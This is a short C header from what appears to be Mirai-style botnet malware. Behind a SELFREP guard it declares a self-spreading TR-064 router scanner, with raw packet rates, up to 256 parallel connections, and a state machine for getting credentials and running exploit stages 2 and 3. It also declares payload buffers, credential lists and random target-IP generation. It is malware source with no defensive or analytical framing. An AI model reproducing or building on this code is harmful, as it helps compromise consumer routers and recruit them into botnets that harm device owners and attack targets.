#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define tr064_SCANNER_MAX_CONNS   3
#define tr064_SCANNER_RAW_PPS     788
#else
#define tr064_SCANNER_MAX_CONNS   256
#define tr064_SCANNER_RAW_PPS     788
#endif

#define tr064_SCANNER_RDBUF_SIZE  1080
#define tr064_SCANNER_HACK_DRAIN  64

struct tr064_scanner_connection
{
    int fd, last_recv;
    enum
    {
        tr064_SC_CLOSED,
        tr064_SC_CONNECTING,
        tr064_SC_GET_CREDENTIALS,
        tr064_SC_EXPLOIT_STAGE2,
        tr064_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[tr064_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void tr064_scanner();
void tr064_kill(void);

static void tr064_setup_connection(struct tr064_scanner_connection *);
static ipv4_t get_random_tr064_ip(void);

#endif
